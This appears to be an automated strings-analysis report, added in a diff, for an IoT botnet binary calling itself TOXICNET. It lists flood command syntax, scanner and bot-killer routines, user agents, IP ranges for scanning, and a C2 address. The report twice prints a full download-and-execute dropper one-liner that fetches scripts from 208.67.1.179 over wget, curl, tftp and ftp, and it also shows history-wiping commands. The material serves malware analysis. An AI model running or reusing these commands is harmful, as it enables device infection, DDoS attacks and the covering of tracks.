@@ -1,0 +1,434 @@
+=============================================================================
+========	BINARY ID :30c8780b8553466146b0fbd020ca0b9b69caf58e==================================================
+================================================================================
+================================================================================
+========	STRINGS SUMMARY : =====================================================
+================================================================================
+TOTAL STRINGS COUNT :2940
+SUPSCPECTED LINES COUNT :181
+SUPSCPECTED STRINGS COUNT (DISTINCT) :31
+SUPSCPECTED STRINGS WEIGHT :120
+SUSPECT STRING SCORE : [120 / 150] 80%
+USER AGENTS STRINGS COUNT :9
+STATIC IPs STRINGS COUNT :2
+DYNAMIC IPs STRINGS COUNT :198
+================================================================================
+========	STRINGS DETAILS : =====================================================
+================================================================================
+================================================================================
+========	SUSPECTED STRINGS : =====================================================
+================================================================================
+bin*
+botnet
+swatnet
+fucknet
+cracknet
+weednet
+gaynet
+queernet
+ballnet
+unet
+ cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.179/bins.sh; curl -O http://208.67.1.179/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 208.67.1.179 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 208.67.1.179; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 208.67.1.179 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n
+telnet
+/dev/netslink/
+/usr/
+/proc/cpuinfo
+PING
+^$Failed opening raw socket.
+Invalid flag "%s"
+Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
+Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
+%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
+%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n
+SCANNER
+STOPPING SCANNER
+STARTING SCANNER ON -> %s
+COMMENCING BOT KILL ON -> %s
+UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>
+TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)
+HTTP
+HTTPFLOOD
+CNC <target> <port> <time>
+STD <target> <port> <time>
+KILLATTK
+Killed %d.
+None Killed.
+/proc/net/route
+TOXICNET
+/etc/rc.d/rc.local
+fork failed\n
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+No such process
+Interrupted system call
+No child processes
+Too many open files in system
+Read-only file system
+Level 2 not synchronized
+Machine is not on the network
+Name not unique on network
+Interrupted system call should be restarted
+Socket operation on non-socket
+Protocol wrong type for socket
+Socket type not supported
+Network is down
+Network is unreachable
+Network dropped connection on reset
+Software caused connection abort
+Connection reset by peer
+Transport endpoint is already connected
+Transport endpoint is not connected
+Connection timed out
+Connection refused
+Host is down
+No route to host
+Operation already in progress
+Operation now in progress
+/bin/sh
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+/etc/hosts
+/etc/config/hosts
+fdopen_pids
+libc/sysdeps/linux/m68k/vfork.S
+fork.c
+getpid.c
+kill.c
+__syscall_kill
+sigprocmask.c
+waitpid.c
+spec_flags.4040
+strstr.c
+_string_syserrmsgs.c
+inet_ntoa.c
+inet_makeaddr.c
+gethostbyname.c
+gethostbyname_r.c
+connect.c
+socket.c
+rand.c
+random.c
+randtbl
+random_r.c
+random_poly_info
+system.c
+__socketcall.c
+inet_aton.c
+dnslookup.c
+get_hosts_byname_r.c
+inet_pton4
+inet_pton6
+inet_ntop4
+inet_ntop6
+read_etc_hosts_r.c
+__read_etc_hosts_r
+__socketcall
+waitpid
+random
+connect
+GetRandomPublicIP
+numpids
+initConnection
+inet_pton
+sendTCP
+__GI_random_r
+getpid
+getHost
+__libc_getpid
+makeRandomStr
+sendHTTP
+GetRandomIP
+system
+__open_etc_hosts
+__dns_lookup
+random_r
+gethostbyname_r
+tcpcsum
+socket
+_string_syserrmsgs
+__GI_inet_ntoa
+srandom_r
+__GI_inet_ntoa_r
+sendHTTP2
+__GI_srandom_r
+kill
+__GI_sigprocmask
+inet_addr
+connectTimeout
+__GI_kill
+strstr
+init_rand
+rand
+__GI_gethostbyname_r
+__GI_inet_ntop
+fork
+__GI_gethostbyname
+__GI_random
+__GI_fork
+__GI_getpid
+inet_aton
+processCmd
+get_telstate_host
+__GI_socket
+listFork
+srand
+sendUDP
+inet_ntoa
+__libc_system
+__get_hosts_byname_r
+botkiller
+__GI_inet_pton
+gethostbyname
+__vfork
+knownBots
+__libc_waitpid
+socket_connect
+__GI_waitpid
+vfork
+srandom
+__libc_fork
+scanPid
+rand_cmwc
+inet_ntoa_r
+__GI_strstr
+__GI_connect
+inet_ntop
+__GI_inet_aton
+__GI_vfork
+__GI_inet_addr
+__libc_connect
+pids
+sigprocmask
+/a㫺轐聊ᑧ⸢ﳿ⸠㘠퀌渠ࠀ耡⠜깒渠ࠀ⠠ᰀ联꺰n䛿㑠渠ࠀ簑Ā☀渠ࠀ⠠ᰀ$諥탿ࠠ聐⡲껒ࠀȯ/į｡
+Jf烿⸢ﳿ⸠ࠀĤ肔Ƞ聖䀭⸠ἤ幎畎噎ȯ渭ࠀ깓ࠀͰ꺰ကd븀⸠က裤䀭ﳿ渠
+================================================================================
+========	USER AGENTS STRINGS : =====================================================
+================================================================================
+Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)
+Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5
+Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
+Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0
+Opera/6.04 (Windows XP; U) [en]
+Opera/9.99 (X11; U; sk)
+Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
+%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
+%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n
+================================================================================
+========	STATIC IP ADRESSES : =====================================================
+================================================================================
+208.67.1.179:23
+8.8.8.8
+================================================================================
+========	DYNAMIC IP MASKS : =====================================================
+================================================================================
+112.5.%d.%d
+117.165.%d.%d
+85.3.%d.%d
+37.158.%d.%d
+95.9.%d.%d
+41.252.%d.%d
+58.71.%d.%d
+104.55.%d.%d
+78.186.%d.%d
+78.189.%d.%d
+221.120.%d.%d
+88.5.%d.%d
+41.254.%d.%d
+103.20.%d.%d
+103.47.%d.%d
+103.57.%d.%d
+45.117.%d.%d
+101.51.%d.%d
+137.59.%d.%d
+1.56.%d.%d
+1.188.%d.%d
+14.204.%d.%d
+27.0.%d.%d
+27.8.%d.%d
+27.50.%d.%d
+27.54.%d.%d
+27.98.%d.%d
+27.112.%d.%d
+27.192.%d.%d
+36.32.%d.%d
+36.248.%d.%d
+39.64.%d.%d
+42.4.%d.%d
+42.48.%d.%d
+42.52.%d.%d
+42.56.%d.%d
+42.63.%d.%d
+42.84.%d.%d
+42.176.%d.%d
+42.224.%d.%d
+43.253.%d.%d
+43.230.%d.%d
+163.53.%d.%d
+62.252.%d.%d
+43.245.%d.%d
+62.255.%d.%d
+123.25.%d.%d
+103.54.%d.%d
+27.255.%d.%d
+103.204.%d.%d
+123.24.%d.%d
+113.191.%d.%d
+81.100.%d.%d
+113.188.%d.%d
+113.189.%d.%d
+94.174.%d.%d
+14.160.%d.%d
+14.161.%d.%d
+14.162.%d.%d
+14.163.%d.%d
+14.164.%d.%d
+14.165.%d.%d
+14.166.%d.%d
+14.167.%d.%d
+14.168.%d.%d
+14.169.%d.%d
+14.170.%d.%d
+14.171.%d.%d
+14.172.%d.%d
+14.173.%d.%d
+14.174.%d.%d
+14.175.%d.%d
+14.176.%d.%d
+14.177.%d.%d
+14.178.%d.%d
+14.179.%d.%d
+14.180.%d.%d
+14.181.%d.%d
+14.182.%d.%d
+14.183.%d.%d
+14.184.%d.%d
+14.185.%d.%d
+14.186.%d.%d
+14.187.%d.%d
+14.188.%d.%d
+14.189.%d.%d
+14.190.%d.%d
+14.191.%d.%d
+45.121.%d.%d
+45.120.%d.%d
+45.115.%d.%d
+43.252.%d.%d
+43.240.%d.%d
+41.174.%d.%d
+49.118.%d.%d
+78.188.%d.%d
+45.127.%d.%d
+103.30.%d.%d
+14.33.%d.%d
+123.16.%d.%d
+202.44.%d.%d
+116.93.%d.%d
+91.83.%d.%d
+41.253.%d.%d
+117.173.%d.%d
+113.190.%d.%d
+146.88.%d.%d
+112.196.%d.%d
+113.178.%d.%d
+112.45.%d.%d
+183.223.%d.%d
+116.71.%d.%d
+103.44.%d.%d
+110.235.%d.%d
+124.253.%d.%d
+211.237.%d.%d
+117.175.%d.%d
+178.93.%d.%d
+111.9.%d.%d
+222.252.%d.%d
+113.174.%d.%d
+113.160.%d.%d
+113.161.%d.%d
+113.162.%d.%d
+113.163.%d.%d
+113.164.%d.%d
+113.165.%d.%d
+113.166.%d.%d
+113.167.%d.%d
+113.168.%d.%d
+113.169.%d.%d
+123.17.%d.%d
+123.18.%d.%d
+123.19.%d.%d
+123.20.%d.%d
+123.21.%d.%d
+123.22.%d.%d
+222.253.%d.%d
+222.254.%d.%d
+222.255.%d.%d
+37.247.%d.%d
+41.208.%d.%d
+183.220.%d.%d
+175.201.%d.%d
+103.198.%d.%d
+50.205.%d.%d
+88.248.%d.%d
+88.105.%d.%d
+88.247.%d.%d
+85.105.%d.%d
+188.3.%d.%d
+103.203.%d.%d
+103.55.%d.%d
+103.220.%d.%d
+183.233.%d.%d
+103.242.%d.%d
+103.14.%d.%d
+103.195.%d.%d
+103.214.%d.%d
+103.218.%d.%d
+103.225.%d.%d
+103.228.%d.%d
+103.231.%d.%d
+103.60.%d.%d
+103.248.%d.%d
+103.253.%d.%d
+103.255.%d.%d
+103.35.%d.%d
+103.49.%d.%d
+103.62.%d.%d
+144.48.%d.%d
+163.47.%d.%d
+223.29.%d.%d
+59.153.%d.%d
+113.176.%d.%d
+113.175.%d.%d
+113.177.%d.%d
+113.183.%d.%d
+202.164.%d.%d
+203.134.%d.%d
+210.56.%d.%d
+49.156.%d.%d
+203.210.%d.%d
+117.181.%d.%d
+117.178.%d.%d
+117.177.%d.%d
+117.176.%d.%d
+117.170.%d.%d
+117.171.%d.%d
+117.162.%d.%d
+112.26.%d.%d
+112.27.%d.%d
+112.28.%d.%d
+112.29.%d.%d
+112.30.%d.%d
+112.31.%d.%d
+203.150.%d.%d
+50.233.%d.%d
+================================================================================
+========	/proc FOLDER ACCESS : =====================================================
+================================================================================
+/proc/cpuinfo
+/proc/net/route
+================================================================================
+========	HISTORY TEMPERING : =====================================================
+================================================================================
+history -c;history -w
+cd /root;rm -rf .bash_history
+ClearHistory
+================================================================================
+========	AUTOINSTALL COMMANDS : =====================================================
+================================================================================
+ cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.179/bins.sh; curl -O http://208.67.1.179/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 208.67.1.179 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 208.67.1.179; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 208.67.1.179 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n
